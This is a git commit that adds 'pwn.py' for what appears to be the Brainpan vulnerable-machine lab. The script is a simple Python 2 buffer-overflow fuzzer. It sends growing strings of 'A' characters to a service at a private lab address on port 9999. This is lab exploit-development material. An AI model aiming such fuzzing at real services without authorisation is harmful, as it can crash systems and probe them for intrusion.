f6cb8dd2480677f187c834aaf5fe57ba460e6a87
root <neal1991@sina.com>
2019-03-13 21:06:12 -0400

    add brainpan

---
+++ Brainpan/pwn.py
@@ -0,0 +1,15 @@
+#! /usr/bin/python
+import socket
+
+buffer = ["A"]
+counter = 100
+while len(buffer) <= 30:
+    buffer.append("A" * counter)
+    counter = counter + 100
+for string in buffer:
+    print "Fuzzing with %s bytes" % len(string)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect = s.connect(('192.168.3.149', 9999))
+    s.send(string + '\r\n')
+    data = s.recv(1024)
+    s.close()
